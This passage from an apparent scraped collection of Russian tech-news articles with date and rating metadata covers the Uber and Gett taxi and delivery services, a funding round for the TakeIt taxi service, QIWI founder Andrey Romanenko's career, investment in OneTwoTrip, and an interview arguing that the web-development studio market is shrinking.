сжатые сроки, что может быть выгодно некоторым компаниям.\n\r\nВ зависимости от рынка Gett предлагает разные решения по доставке товаров или услуг. Например, в Москве пользователи сервиса могут оформить доставку суши или замену дисплея iPhone. А UberEATS предпочитает фокусироваться на более стандартных вещах — в Париже, Чикаго, Сан-Франциско, Вашингтоне и других городах сервис позволяет оформить доставку еды из ближайших ресторанов.\n\n\n\r\nПо общей целенаправленности можно заметить, что Uber больше фокусируется на доставке еды или предоставлении корпоративных услуг наравне с опциями для малого бизнеса. А вот Gett собирается системно заниматься доставкой только товаров в первое время. И в этом сегменте компании придётся конкурировать с Amazon, которая уже неоднократно проявляла интерес к быстрой доставки любых товаров потребителям и запустила похожие сервисы в разных странах. Одним из преимуществ Amazon является использование дронов для доставки, но сложности с регистрацией такого вида доставки услуг даёт Gett определённое преимущество, особенно на фоне возможности использования сервиса в качестве курьерской службы для частных клиентов. Только вопрос в том, хватит ли этого для генерации подходящего уровня прибыли остается открытым.", {"day": "1", "month": "февраля", "time": "20:11"}, {"rate": 8, "views": 3900}], ["Представители российских общественных и некоммерческих организаций в области таксомоторного бизнеса заявляют о начале «масштабной кампании» против такси-сервиса Uber и аналогичных сервисов, работающих на территории России. \n\r\nДокумент подписан следующими людьми:\n \r\nСтанислав Швагерус и Виктор Соловьев в беседе с Rusbase подтвердили подлинность документа. «Uber в данном случае – понятие собирательное. У всех [подобных сервисов] правила напрочь противоречат действующему законодательству», заявил Швагерус.\n\r\n««Агрегаторы», руководствуясь исключительно внутренними правилами, которые по ряду ключевых позиций не соответствуют федеральному законодательству, уходят от налогов и перекладывают всю нагрузку за исполнение услуг и ответственности за нее исключительно на водителей такси. Верхом беззакония деятельности американской компании Uber в России является ее работа по законодательству Нидерландов», говорится в меморандуме.\n\r\nИз-за этого, пишут авторы документа, рабочие места, социальные и трудовые гарантии ликвидируются, государство перестает получать налоги, а автомобильная промышленность – корпоративные заказы на новые автомобили для такси. Из-за вынужденного снижения расходов страдает и обеспечение безопасности в такси, говорится в меморандуме, из-за чего «в городах, на дорогах страны ежедневно гибнут десятки пассажиров такси».\n\r\nВ течение полугода составители документа намерены реализовать две задачи, «направленные на улучшение социально-экономического положения водителей»:\n1. Привлечь органы исполнительной власти в каждом субъекте РФ к пересмотру и приведению в соответствие с федеральным законодательством правил таксомоторной деятельности. Это «приведет к более справедливому перераспределению доходов» между классическим такси и сервисами вроде Uber, отмечается в документе;\n\r\n2. Использовать такси для «транспортного обслуживания государственных органов всех уровней» и таким образом увеличить спрос на услуги такси. «Такая мера позволит также минимизировать госрасходы на закупку и аренду автомобилей для служебного использования чиновниками», полагают авторы документа.\r\n«По первому пункту в Москве уже ведется работа Департаментом транспорта, по второму — Общероссийский народный фронт ищет способы, как ограничить чиновников», рассказал Швагерус Rusbase.\n\r\nВ официальном ответе департамента говорится, что «в адрес крупнейших диспетчерских служб по вызову такси был направлен запрос на предоставление документов, регламентирующих оказание услуг населению, а также обоснований соответствия указанных документов федеральному законодательству. \n\r\nВ данный момент Сергей также занимается организацией забастовки таксистов против Uber в Париже.\n\r\nВ августе 2015 года Федеральная антимонопольная служба (ФАС) РФ не выявила признаков нарушений антимонопольного законодательства онлайн-сервисами Uber, Gett и «Яндекс.Такси».\n\r\n18 января «Мегамозг» писал, что лондонские таксисты запустили краудфандинговую кампанию, чтобы «изгнать» Uber из города. Они планируют собрать краудфандинговой www.crowdfunder.co.uk/Action-for-Cabbies площадке около 600 тысяч фунтов (примерно $850 тысяч). Этого хватит, чтобы покрыть издержки, связанные с ходатайством о пересмотре решения властей по вопросам лицензирования и регулирования Uber. \n\r\nПо их мнению, такси-сервис в Лондоне до сих пор является полулегальным. Uber и традиционные таксисты регулируются по-разному и не находятся в едином правовом поле. \n\r\nЦеновая политика Uber сводится, по большому счету, к банальному демпингу, полагают лондонские таксисты. Ну в гонке под названием «кто дешевле» преимущество Uber очевидно.\n\r\nМы обратились в Uber и Gett за комментариями, задав следующие вопросы:\n\n— Почему это безумие, если ФАС ничего не выявила? \n— Есть ли на самом деле проблемы или «белые пятна» в законодательстве РФ?\n— Считаете ли Вы, что таксопарки обречены, а профессии таксиста больше нет?\n\nЕвгения Шипова, официальный представитель Uber в России:1. Uber ведет диалог с представителями регуляторов во всех странах, где доступно приложение, и Россия не является исключением. \n\r\n2. Uber — это мобильное приложение, соединяющее пользователей и водителей. Водители Uber — независимые партнеры, юридические лица или индивидуальные предприниматели, которые работают в соответствии с российским законодательством. Uber предоставляет новые экономические возможности для своих партнеров. Сотрудничество с Uber стало источником дополнительного заработка для тысяч партнеров. Среди основных причин, почему партнеры выбирают сотрудничество с Uber можно назвать:\n\r\nГИБКОСТЬ: партнеры работают в системе, когда считают нужным. Система не предполагает смен и минимального количества часов работы. По данным наших исследований, 87% партнеров выбирают Uber из-за возможности гибкого сотрудничества.\n\r\nПРОЗРАЧНОСТЬ: выплаты за поездки происходят автоматически по безналичному расчету на еженедельной основе. Uber предоставляет полную отчетность по выплатам для облегчения административных процедур.\r\nПредставители Gett отослали нас к предыдущим сообщениям компании относительно соответствия деятельности законодательству РФ:ООО «ГетТакси Рус» (далее Gett) — это российское юридическое лицо, которое не является филиалом или представительством иностранной компании. ООО «ГетТакси Рус» ведет свою деятельность с соблюдением всех законов Российской Федерации и осуществляет выплату всех налогов, предусмотренных действующим законодательством РФ. Регулярные проверки государственных органов не выявили нарушений в деятельности компании, в том числе и в области налогового законодательства. \n\r\nGett работает только с лицензированными перевозчиками — таксомоторными компаниями или ИП во всех городах своего присутствия, а именно: в Москве, Санкт-Петербурге, Новосибирске, Нижнем Новгороде, Сочи, Краснодаре, Екатеринбурге, Красноярске, Самаре и Ростове-на-Дону. Принципы работы компании и ее деятельность направлены на развитие и стимуляцию спроса со стороны потребителей на услуги лицензированных перевозчиков. \n\r\nЭтому способствует тарифная политика, которая позволяет потребителю заказать лицензированное такси быстро и по доступной цене. Официальные перевозчики получают большее количество заказов и за счет увеличивающегося спроса вытесняют с рынка нелегальных игроков, помогая сделать сферу такси максимально цивилизованной.\n\r\nПредставители Gett пояснили, что у компании нет дополнительных выплат — у водителя и у пассажира разная сетка тарифов (водителю фиксированно оплачивают 20 минут поездки, а у пассажиров с первой минуты поминутный тариф).", {"day": "26", "month": "января", "time": "17:45"}, {"rate": 19, "views": 16000}], ["Российской сервис по заказу такси TakeIt привлек около $2 миллионов. Основным инвестором стал экс-глава «Рос.Такси» Павел Варзумов. По его словам, сумма в $2 миллиона – ориентировочная, так как требуется провести оценку параметров компании, чтобы определиться окончательно. \n\r\nРос.Такси – это программное обеспечение, позволяющее таксопаркам принимать заказы, управлять работой водителей и составлять статистику по результатам работы. 29 января 2015 года компания «Рос.Такси» была куплена «Яндексом».\n\r\nЕще одним инвестором сервиса станет бывший директор по маркетингу компании «Рос.Такси» и текущий глава TakeIt Александр Оникиенко. Последний инвестирует 10 миллионов рублей собственных средств. В раунде будет участвовать еще один (помимо Варзумова и Оникиенко) частный инвестор. Пока его имя не раскрывается.\n\r\nTakeIt предлагает рынку «интересную формулу, как можно сэкономить и оптимизировать затраты на такси», объяснил Павел Варзумов причину своего участия в качестве инвестора. Компания TakeIt еще совсем молодая, но уже сейчас инвесторы решили вложить в нее непривычно крупную сумму по меркам российского венчурного рынка. «Деньги ведь вкладывают не конкретно в компанию, а в людей, которые ее возглавляют. Вера конкретно в эту команду у нас есть», рассказал Варзумов изданию Rusbase.\n\r\nСервис TakeIt был запущен 27 июля 2015 года. Компания совмещает в себе классическое такси (свои авто, свой таксопарк) и сервис по заказу такси (передача заказов свободному водителю).\n\r\nВ автопарке компании сейчас 1200 принадлежащих TakeIt автомобилей и 300 привлеченных водителей. Около месяца назад из-за крупных долгов под управление компании перешел московский таксопарк «Измайлово». \n\r\nПо словам представителя компании, от своих конкурентов (Uber, Gett, «Яндекс.Такси») TakeIt отличается тем, что владеет задействованными автомобилями и предлагает относительно низкие тарифы. На сайте компании даже приводится таблица, где тарифы TakeIt сравниваются с тарифами других такси-сервисов.\n\r\nСейчас сервис работает в основном в России. По словам Варзумова, TakeIt также собирается выходить на иностранные рынки. Экспансия начнется с европейских стран. На данный момент уже заключены договоры с некоторыми зарубежными контрагентами – в частности, насчет трансферов из аэропортов во Франции. \n\r\nСобственное приложение для заказа такси компания планирует запустить в конце января.", {"day": "13", "month": "января", "time": "08:17"}, {"rate": 7, "views": 4800}], ["Сооснователь группы QIWI, основатель фонда Run Capital Андрей Романенко стал лауреатом премии World Finance Awards в номинации «предприниматель года» (Entrepreneurs of the Year 2015) в секторе «финансовые сервисы» (Financial Services).\n\r\nИздание «Коммерсант» опубликовало подробную историю его успеха. \n\r\n«Мегамозг» приводит наиболее интересные факты.\n\nОфис-музей\r\nВ офисе Андрея Романенко на Спиридоновке несколько десятков птиц киви: плюшевые, деревянные, киви на картинах и на мебели. Этот музей он собирает уже несколько лет, с тех пор как птичка киви стала символом его основного детища — компании Qiwi. Но сейчас офис Романенко и офис Qiwi находятся в разных местах. В этом году бизнесмен официально объявил, что уходит из компании, чтобы сосредоточиться на своем венчурном фонде Run Capital. \n\r\nQiwi еще сохраняет созданный Романенко хипстерский стиль: в Северном Чертаново по всему помещению расставлены пуфики, к потолку подвешены кресла-качели, есть даже кабинки для сна, сотрудники поголовно ходят в кедах и джинсах и общаются главным образом через мессенджеры. А сам Романенко сегодня чаще носит костюм, чем джинсы, и очень много времени проводит за границей, погружаясь в венчурный бизнес.\n\nБыстрый успех\r\nБизнесом Андрей Романенко начал заниматься в семнадцать: записывал компьютерные игры на дискеты и продавал. \n\r\nНа третьем курсе Романенко вызвался продать для знакомого (тот был сотрудником одной из компаний-операторов) карты оплаты связи. В 1990-е это был основной способ пополнения счета мобильного телефона. Так возник первый бизнес — прообраз Qiwi, «Магазин пластиковых карт», который довольно быстро занял 70% рынка.\n\r\nВо многом успех обеспечивали достойный по тем временам брендинг и хорошая рекламная раскрутка. Совладельцем этого, как и всех последующих бизнесов Романенко, был его отец, Николай Романенко. В СССР Романенко-старший руководил Внешторгиздатом, а в 1989 году стал одним из основателей российского филиала американского рекламного агентства BBDO, каковым и руководил потом долгие годы.\n\r\nПродажами карт партнеры занимались недолго: этот бизнес оказался не так уж выгоден, и его потихоньку начинали теснить конкуренты с терминалами оплаты. Так, например, несколькими месяцами раньше от «Автокард-Холдинга» (специализировался на картах предоплаты бензина) отпочковалась компания Бориса Кима e-port. \n\nПервое объединение и смена стратегии\r\nЧтобы противостоять новой технологии, Романенко решает объединиться с другими продавцами пластиковых карт: вместе с несколькими мелкими игроками он создает «Объединенную систему моментальных платежей» (ОСМП), которая к 2004 году займет почти весь рынок. Хотя умение объединяться пригодится Романенко еще не раз, тогда победы на рынке оно ему не принесло: терминалы оплаты явно побеждали, и Романенко задумался о смене стратегии. Изначально он закупил такие же POS-терминалы, как у конкурентов, и стал продвигать их, но позже заметил платежные терминалы компании «Элекснет». Этот конкурент Романенко стал первым в России принимать платежи за мобильную связь через массивные антивандальные железные ящики, названные платежными терминалами.\n\r\nРоманенко увлекся идеей терминалов, но бизнес-стратегию «Элекснета» творчески переработал. «Элекснет» владел всеми своими терминалами, что затрудняло распространение и делало компанию неповоротливой, а Романенко решил работать по принципу франшизы. Также были усовершенствованы устройства: вместо массивных ящиков с железными кнопками «Элекснета» появились более изящные терминалы с тачскрином.\n\nПоследний вагон\r\nСмена стратегии позволила привлечь инвестиции: в 2003 году идеей электронных платежей всерьез заинтересовался владелец Первого процессингового банка Сергей Солонин. Через несколько лет он станет основным владельцем и генеральным директором Qiwi. \n\r\nВпрочем, даже с деньгами у компании был реальный шанс опоздать. Конкурентов к 2004 году было много: помимо «Элекснета» на рынке работали «Рапида», WebMoney и легший в основу «Яндекс.Деньги» PayCash — и они также были вооружены деньгами и технологиями. У главного в бизнесе «Элекснета» уже были инвестиции скандинавского фонда Mint Capital, возможность вносить деньги на карты Visa, оплата услуг ЖКХ без комиссии и около тысячи терминалов по всей стране.\n\r\nПрактически вскочив в последний вагон, Романенко тем не менее приготовил сюрприз для конкурентов: он предлагал свои терминалы вдвое дешевле других продавцов — по $4 тысячи (по курсу 2005 года).\n\r\nБлагодаря дешевизне и хорошему дизайну терминалов, а также агентской модели развития сети, уже в 2007 году бывшие продавцы карточек стали первыми в стране по числу платежей, а терминалов у них было 26 тысяч. Франшиза дала возможность Qiwi быстро расти и даже начать экспансию на рынки стран СНГ.\n\r\n«Элекснет» с сетью из пары тысяч собственных терминалов теперь плелась далеко позади, а главным конкурентом стала e-port, в которую инвестировал миллиардер Юрий Мильнер.\n\nВторое объединение и IPO\r\nПо всем раскладам эта ситуация должна была вылиться в ценовую войну, которая обескровила бы обе стороны, но Андрей Романенко снова предложил конкуренту объединиться. Борис Ким принял предложение, и в 2007 году появилась компания Qiwi. \n\r\nВ СНГ компании стало тесно, и Романенко пошел в другие страны, причем, в отличие от конкурентов, преуспел и там. Сейчас терминалы можно увидеть в Южной Америке и в Африке, хотя финансово это не очень успешное начинание. «Основной для них бизнес — российский, а за границей доходы у них очень незначительные, как показывают итоговые цифры»,— делает вывод, исходя из истории финансовой отчетности компании, аналитик «ВТБ Капитала» Владимир Беспалов.\n\r\nСтоль бурное развитие к 2013 году обеспечило Qiwi сетью из 200 тысяч терминалов по всему миру, рентабельностью в 35% и чистой прибылью в 2,17 млрд рублей. В том же году состоялось IPO на NASDAQ. Хотя в США про терминалы оплаты даже не слышали, инвесторы впечатлились темпами роста компании и оценили ее в $884 млн. Руководство Qiwi заработало на IPO более $200 млн, а во время осеннего SPO — еще около $300 млн. По итогам этих размещений Романенко продал почти все свои акции, по разным оценкам, заработав $50-60 млн, после чего отошел от оперативного управления компанией и занялся другими проектами.\n\nНовые проекты\r\nК 2013 году он увлекся работой с венчурными фондами. Знакомые предпринимателя говорят, что уход в венчурный бизнес был во многом обусловлен знакомством с Юрием Мильнером — тот стал примером для подражания на новом этапе жизни Романенко.\n\r\nНо повторить успех Мильнера на его поляне Андрею Романенко, конечно, не удалось, хотя определенные достижения есть. С 2011 года при участии Романенко были созданы фонд посевных инвестиций AddVenture (самые известные вложения — сервис доставки еды Delivery Club и доставка продуктов по определенному рецепту «ШефМаркет») и венчурный фонд iTech Capital (известен вложениями в сервис покупки авиабилетов Aviasales и сайт покупки билетов на зрелищные мероприятия Ticketland).\n\r\nВпрочем, помимо перечисленных инвестиций, которые можно считать удачными, была у фондов Андрея Романенко и одна большая ошибка: в свое время Романенко не решился вложиться в приложение для вызова такси Gett, хотя такая возможность была.\n\r\nСейчас Андрей Романенко ушел с головой в свой новый бизнес — инвестиционный фонд Run Capital, вкладывающийся в стартапы на ранних стадиях развития. В Run Capital оказались и многие сооснователи Qiwi — Николай Романенко, Игорь Михайлов, Сергей Федющенко и Андрей Муравьев (все они участвовали в фондах iTech Capital и AddVenture).", {"day": "14", "month": "декабря", "time": "15:58"}, {"rate": 9, "views": 12000}], ["Отечественное трэвел-агентство, предоставляющие свои услуги в России, странах бывшего СНГ и Европе, накануне получило весьма солидное финансирование в размере 4 млн долларов США от шведского венчурного фонда Vostok New Ventures с «советскими» корнями. \n\r\nКак сообщает портал Tech.eu, данные о сделке стали доступны интернет-общественности после того, как шведская компания опубликовала финансовую отчетность за незавершенный текущий год. Известно, что шведский венчурный фонд не ограничился одним лишь проектом OneTwoTrip, за один лишь третий квартал 2015 года вложив финансовые средства в размере 7,5 млн в стартап Merro, работающий над собственной инвестиционной платформой. Куда более крупная сумма пошла на финансирование известного сервиса BlaBlaCar для организации совместных поездок на автомобиле, который становится все более популярным на отечественном рынке. \n\r\nСтартап OneTwoTrip был создан в 2011 году и предлагал услуги онлайн-резервирования гостиниц и авиабилетов. Известно, что еще в марте нынешнего года компании удалось привлечь инвестиции на 8 млн долларов, а чуть ранее одолеть рубеж в 25 млн от таких крупных игроков на венчурном рынке, как Phenomenon Ventures, Goldman Sachs, а также Atomico — компании сооснователя всеми известного мессенджера Skype Никласа Зеннстрома (Niklas Zennström).\n\r\nНесмотря на постоянные вливания в проект, популярность OneTwoTrip падает. Так, по данным агентства SimilarWeb, количество посетителей официального сайта трэвел-стартапа за последние полгода снизилось практически в два раза – с 1,5 млн в мае до 880 тысяч в октябре. Судя по всему, онлайн-сервис не в силах достойно противостоять конкурентам в лице таких стартапов, как, например, Anywayanyday and Biletix. Факт несколько удивительный, учитывая количество капиталовложений и общие положительные тенденции рынка онлайн-туризма, оборот которого в прошлом году составил 11,2 млрд долларов. Кроме того, каждый год в этой сфере наблюдается стабильный рост в 24%. \n\r\nШведский венчурный фонд со столь благозвучным для русскоязычных пользователей названием образовался в результате реструктуризации предприятия Old Vostok Nafta, истоки которого уходят в 1996 год, когда глава компании Адольф Лундин (Adolf H. Lundin) решил зарегистрировать предприятие для организации прямых инвестиций на рынке стран бывшего СССР. Сейчас Vostok New Ventures считается весьма серьезным игроков в сфере венчурного инвестирования, располагая такими проектами в своем портфеле, как Avito, Gett, Yell, Delivery Hero и др.", {"day": "23", "month": "ноября", "time": "23:58"}, {"rate": 12, "views": 3100}], ["Я часто беседую с владельцами российских веб-студий и агентств, чтобы понять и объяснить читателям происходящие процессы на нашем рынке. На самом деле, рынок меняется. Думаю, эти изменения ощущают все игроки, в том числе и мы в Simtech Development. А наша работа на международном рынке подтверждает, что процесс это глобальный и охватывает не только Россию, но и большинство западных стран.\n\r\nНедавно на CMS Magazine вышло мое интервью с Михаилом Токовининым, одним из партнеров QSOFT+AIC, основателем amoCRM и очень авторитетным экспертом. Это интервью касалось его опубликованного открытого письма в редакцию ЦП «Рынок разработки сайтов умирает — как видеопрокат в 2002 году». Думаю, многие из вас если не читали, то уж слышали о нем. \n\r\nМнение Михаила вызвало широкий резонанс среди веб-разработчиков и представителей digital-рынка, и я решила узнать подробнее о предпосылках, причинах и, что самое важное, мыслях Михаила о том, что же делать разработчикам и как подстраиваться под изменения.\n\r\nСегодня я решила опубликовать это интервью здесь. Интересно узнать, что думаете вы по этому поводу и к чему нам всем готовиться (в конце интервью есть опрос для статистики). Приятного и полезного чтения!\n\n\n\n\n\n— Михаил, вы утверждаете, что рынок разработки сайтов умирает, количество заказов и клиентов с каждым годом сокращается и скоро наша отрасль превратится в крайне конкурентную среду. Какие вы видите предпосылки и почему другие этого не замечают?\n\r\n— Прежде чем говорить об объективных факторах и предпосылках, необходимо сделать важную оговорку. Участники рынка всегда находятся в искаженной реальности и не видят объективных трендов, которые неизбежно влияют на рынок. Огромное количество комментариев к моей статье на «Цукерберг позвонит», где люди утверждают: «Нет, такого быть не может, да мы давно здесь работаем, и у нас все хорошо», — только подтверждают мои слова.\n\r\nЯ не случайно в своем письме в редакцию ЦП начал с истории о видеопрокатах. Когда-то рынок видеопрокатов в стране активно развивался, а потом замер. В 2002 году мой друг, владелец нескольких крупных видеопрокатов в Москве, обеспокоился тем, что его выручка стала месяц за месяцем сокращаться. Из всех причин он выбрал самую очевидную — плохую работу директора, и заменил его на меня. Я возглавил сеть из 11 видеопрокатов, но несмотря на всю мою кипучую деятельность и кратковременный подъем, бизнес разорился и был закрыт через 2 года. Я испытал на себе опыт работы на падающем рынке, пережил эту историю и понял, как это работает.\n\r\nСитуация с видеопрокатами в 2002 году очень напоминает сегодняшнюю с сайтами. Очень сложно отойти в сторону и посмотреть на ситуацию трезво. Пока вы стоите у своего станка, вы в упор не замечаете, что происходит. В той реальности, где вы живете, действительно все делают сайты. Вы общаетесь с теми людьми, которым нужны сайты, вы делаете сайты, и ваши друзья делают сайты.\n\r\nНо есть один маркер, который отражает, растет рынок или падает. На падающем рынке вы должны стараться, оптимизировать процессы, делать работу лучше, чем другие, — в общем, быть молодцом. А растущий рынок простит вам любые ошибки, надо лишь успевать отгружать. Вы можете косячить, делать все тяп-ляп — вы все равно будете зарабатывать. Если там, где вы работаете, вдруг стало важно, что у вас за процессы, насколько вы скрупулезно и аккуратно подходите к ним, то, скорее всего, ваш рынок уже падает.\n\n— Так что же объективно происходит на нашем рынке?\n\r\n— Для чего нужны коммерческие сайты? Глобально я вижу только две задачи: привлечь новых клиентов и осуществить продажи либо обслужить имеющихся клиентов, оказать сервисную услугу.\n\r\nДесять лет назад все создавали сайты, потому что бизнес был уверен, что само по себе наличие сайта уже приносит клиентов. Но если посмотреть на ситуацию сегодня, становится более чем очевидно, что сайт сам по себе клиентов не приносит. Более того, сайт просто является площадкой для поиска клиентов и далеко не самой эффективной. Да, есть онлайн-реклама, ее можно считать. Но если объективно просчитать, где проще заполучить клиента: организовав точку продаж на вокзале и у метро или запустив рекламу в Яндекс.Директе, перебивая стоимость лида у конкурентов, — то ответ совсем не очевиден.\n\r\nПродавать в Интернете стало дорого и сложно. Эта среда очень конкурентная. В Интернете вы боритесь за потребителя не только со своими конкурентами, но и со всем бизнесом на земле. Фокус внимания ограничен и, если в эту секунду условный покупатель цветов хочет купить еще и дом в ипотеку, то за его внимание одновременно сражаются и цветочная лавка, и банк. Банк явно выигрывает в этой битве.\n\r\nТакой высококонкурентной истории мир рекламы еще не видел. И в ближайшие десять лет реклама в сети станет гипердорогой.\n\r\nОчень многие бизнесы уже интуитивно почувствовали это и перестали бездумно делать сайты. Количество сайтов неизменно сокращается. Конечно, есть часть рынка, где делают сайты для галочки, чтобы на визитке написать. Но эту задачу отлично решают бесплатные конструкторы. Еще остаются крупные проекты и большие интернет-магазины. Это понятно.\n\r\nНо рынок сайтов — это не те двести заказчиков, которые делают что-то очень дорогое, как кажется моим коллегам. Даже не тысяча или десять тысяч. Рынок — это пятьдесят тысяч сайтов в год. Когда эти пятьдесят тысяч становятся тридцатью пятью тысячами, изменение кажется еле заметным. Многие скажут — ничего страшного. А потом тридцать пять тысяч превратятся в десять тысяч, десять — в пять, а пять в тысячу. Вот тогда рынок сожмется и станет очень конкурентным.\n\r\nЗдесь появятся нишевые игроки. Может быть отраслевая специфика. Но точно, вся мелочь будет вымыта с рынка сервисами, потому что студии, которые клепают сайты за 100 тысяч, станут по сравнению с сервисами совершенно неконкурентоспособными.\n\n— С малым бизнесом, который перейдет на конструкторы для экономии ресурсов, ясно. Ну а куда денутся средние и большие проекты?\n\r\n— Скорее всего, самая жирная часть, а это самые дорогие, крупные и сложные проекты, тоже уйдет. Точнее перетечет в in-house.\n\r\nЗаказчик становится профессиональнее. Более того, для многих привлечение клиента и работа с ним в Интернете превращаются в ключевой бизнес-процесс. Грубо говоря, на одной чаше весов банк а-ля «Тинькофф», у которого собственный мощнейший отдел веб-разработки, где на зарплатах не экономят, а на другой — условный банк «Сибирский кредит», у которого внешний подрядчик на зарплате. И тогда возникает вопрос, не сколько стоят услуги разработчиков, а какая связка конкурентнее и эффективнее.\n\r\nМогу по своему опыту сказать, а я запускал несколько стартапов по разным схемам, никто не сможет конкурировать в качестве со штатными специалистами. И все известные кейсы на рынке это доказывают. Собственная команда дороже, но услугу она выполняет качественнее.\n\r\nЕсли качество станет очень критично для конкуренции на рынке клиента, то для подрядчиков ожидается безрадостное будущее. Именно поэтому, я не понимаю, какое будущее у этого рынка на дистанции 5 — 7 лет. Скорее всего, его нет.\n\r\nЧто останется? Середняк. Проекты в диапазоне от 200 000 до 1 000 000 рублей. Как ни странно, уже сейчас это очень незначительная часть рынка. У нас есть очень сильный перекос проектов в дешевом сегменте и много предложений в дорогом. А середина всегда была не слишком густонаселенной. И она, вероятнее всего, продолжит жить.\n\r\nКонечно, слегка утрировано сравнивать наш рынок с видеопрокатом, который полностью исчез. Рынок веб-разработки будет больше похож на тюнинг автомобилей. Есть массовый потребитель, а есть какая-то малочисленная каста любителей нестандартных дисков — клуб любителей поменять колеса.\n\n— А как же интернет-магазины? Кто будет их делать?\n\r\n— У интернет-магазинов довольно грустное будущее. Есть такая история, как агрегаторы, которые сильно меняют картину рынка. Мелочи не будет, будут работать несколько доминирующих крупных монстров. И еле живая середина для экзотических потребностей. Эта история, отсутствие длинного хвоста, глобальна, и она закономерна для любого онлайн-бизнеса.\n\r\nВ офлайне есть два — три гиганта и дальше миллионы маленьких магазинов, у которых есть преимущество в виде географического расположения. В онлайне все находятся на расстоянии одного клика. Поэтому степень консолидации любого онлайн-бизнеса должна быть несоизмеримо выше, чем в традиционных областях.\n\n— В таком случае веб-студии и агентства могут переключится на продвижение в Интернете и digital-рекламу. Необходимость в digital-рекламе будет только расти, если конкуренция за внимание потребителя ужесточается. Так ли это?\n\r\n— Идея продажи рекламы — это идея продажи некоего контакта с целевой аудиторией, продажа целевой аудитории бизнесу. Допустим, мы выпускаем журнал о машинах и продаем контакты людей, которые читают наш журнал, автосалонам. Однако проблема современной рекламы состоит в том, что конкуренция за внимание человека меняется, как я уже говорил. Не важно, на каком сайте человек читает о машинах. Мы просто знаем, что ему нужна машина и можем поймать его хоть на порноресурсе. Это меняет историю рекламы.\n\r\nКроме этого, умение привлекать аудиторию становится настолько уникальной и важной компетенцией, что нет смысла продавать лиды, когда можно продавать клиентов. Booking продает отелям не лиды, он продает им клиентов. И забирает себе львиную долю выручки. Мы входим в широкую фазу больших агрегаторов, которые изначально станут консолидировать на себе весь спрос и не будут нуждаться в рекламе.\n\r\nНадо понимать, что умение находить аудиторию и продавать становится важнее, чем сам продукт. Посмотрите, что сейчас делает банк «Тинькофф». Он продает ипотеку, при этом не свою. Считается, что для банка ключевая компетенция — это купить и продать деньги. Но выясняется, что теперь главной способностью стало умение найти клиента и продать ему продукт. И «Тинькофф» продает ипотеку другого банка. Кто из них банк? Кто больше зарабатывает? Кому из них нужна реклама?\n\r\nНаверняка, уже придумали какой-то термин, как назвать то, что происходит сейчас в экономике — что-то вроде постпостиндустриальной экономики, когда владение клиентом является основной ценностью.\n\r\nНапример, вы видите, как может сейчас выглядеть реклама музыкальной группы, когда есть Apple Music, iTunes, ВКонтакте, YouTube?\n\n— Но ведь iTunes сам по себе узнаваемость группе не обеспечит. Нужно продвижение внутри этих сервисов.\n\r\n— Все проще. Если вы пишете хорошую музыку, то люди расшаривают ее, делятся друг с другом, и вы становитесь популярны. Теперь не надо никого раскручивать, продюсировать, деньги все равно заработает iTunes.\n\r\nТо есть в случае с артистами, производителями товара, ничего не меняется. А продюсерские центры и реклама становятся не нужны, как лишние посредники.\n\r\nЕще один пример, отели и Booking. Можно заниматься раскруткой отеля в Париже, и если ты монстр пиара, то даже что-то получится. Но по сравнению с тем, какой поток клиентов приносит этому отелю Booking, это будет ничто. А Booking плевать, куда направлять людей. Где отзывы лучше, туда и поток больше. Поэтому основная задача отеля — менять чаще простыни и туалеты тщательнее чистить. Это лучшее, что он может сделать. У пиара еще есть какой-то потенциал, а у рекламы нет.\n\n— Тогда переходим к важному вопросу, что же делать рынку веб-разработки. Как избежать печальной участи, сохранить команду и прибыль?\n\r\n— Надо понимать, что все текущие веб-студии обладают уникальным и фантастическим ресурсом. У них в руках группа разработчиков, которых они пока кормят. Спрос на разработчиков будет только расти, сайтостроительные технологии никуда не пропадут. Веб-разработке, как технологии, ничего не угрожает. Но очень скоро веб-студии не смогут платить своим разработчикам зарплату, и этот ресурс они потеряют. Однажды придет условный банк и выкупит этих разработчиков за такие деньги, которыми ни одна веб-студия не сможет их удержать. Уже сейчас всех самых сильных веб-разработчиков вымывают с рынка. Веб-студии все чаще должны заниматься обучением, развитием персонала.\n\r\nСегодня есть уникальная возможность, располагая этими ресурсами, развернуться и сделать свой проект, стартап.\n\n— В какой области нужно запускать стартап? Создавать агрегаторы? У нас в компании за последнее время возросло количество заказов на большие маркетплейсы. Это и есть та самая тенденция?\n\r\n— Да, маркетплейсы, как и агрегаторы, это попытка залезть в нишу и распределять клиентский трафик. Но не обязательно делать агрегаторы. В теории агрегаторы звучат круто, но на практике — это, мягко говоря, нетривиальная штука. Победить на рынке агрегаторов, стать там признанным лидером — сверхзадача, по силам немногим.\n\r\nКогда вы выбираете идею для стартапа, важно оказаться не очень поздно и, что намного страшнее, не слишком рано. Значит нужно выбирать такие темы, где уже были первые многообещающие проекты, но они провалились. А вы знаете, почему это случилось, как устранить недостатки и преодолеть так называемую пропасть. Это классика Джеффри Мура.\n\r\nЕсть миллионы проектов, которые сейчас находятся в пропасти. От очевидных, типа 3D принтеров, до менее предсказуемых, как управление проектами. Все системы управления проектами находятся в пропасти. Уже много-много лет ее никто не может переползти. А потенциал настолько огромен, что когда появляется какая-то более-менее прорывная идея, как Slack, она просто взрывается атомной бомбой. Чтобы за год достичь капитализации в 3 миллиарда долларов, надо понимать, что это не только Slack молодцы, это готовность рынка.\n\r\nВзрывной рост демонстрирует не потенциал команды, а потенциал спроса и рынка. Значит, в этой отрасли кроется нефтеносное месторождение, откуда из всех щелей лезет. Управление проектами, бесспорно, такая тема. Я сам разрабатывал проект в этой сфере, программное обеспечение для управления проектами. Но я проиграл и рано ушел оттуда.\n\r\nЕще одной перспективной сферой является образование. Россия это уже поняла. Все классические рынки, как недвижимость (агрегаторы недвижимости, каталоги), тоже находятся в пропасти.\n\r\nВ общем, идей — вагон. Повторюсь: нужно взять такую идею, которая уже не кажется оригинальной и где кто-то этим уже занимается. Просто ответьте на вопрос: если этим уже многие занимаются, какова доля проникновения всех, вместе взятых.\n\r\nМногим кажется, что рынок CRM уже сформировался. Ведь есть столько CRM-систем. Я и сам так думал четыре года назад, когда мы запускали своей проект amoCRM. Я был уверен, что рынок давно поделен. А какой процент бизнеса в мире вообще использует CRM? Дай Бог, если один. Это типичный пример пропасти. Придумаете, как перевалить из одного процента в двадцать — заработаете миллиарды долларов.\n\r\nПоэтому я считаю, что сейчас, когда есть команда из двух — трех разработчиков (а больше и не надо, так как это уже вредно для стартапа), компетенции в дизайне, юзабилити и, что еще ценнее, мобильной разработке, то худшая идея, которую можно было бы себе придумать, делать что-то на заказ.\n\r\nЭто всегда было плохой идеей. Мы начинали в 2004 году. Мы были глупыми и не придумали идею лучше, чем создать 